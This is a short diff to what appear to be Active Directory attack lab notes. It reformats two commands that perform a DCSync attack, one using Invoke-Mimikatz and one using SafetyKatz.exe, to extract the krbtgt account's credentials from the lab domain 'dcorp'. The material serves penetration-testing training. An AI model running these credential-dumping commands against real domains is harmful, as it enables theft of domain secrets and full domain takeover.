@@ -565,17 +565,14 @@ Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=mone
 Execute DCSync:
 
 
-```
-Invoke-Mimikatz -Command '"lsadump::dcsync
-/user:dcorp\krbtgt"'
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 
 
 or
 
+```powershell
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 ```
-C:\AD\Tools\SafetyKatz.exe
-/user:dcorp\krbtgt" "exit"
-```
-AlteredSecurity
-"lsadump::dcsync
+
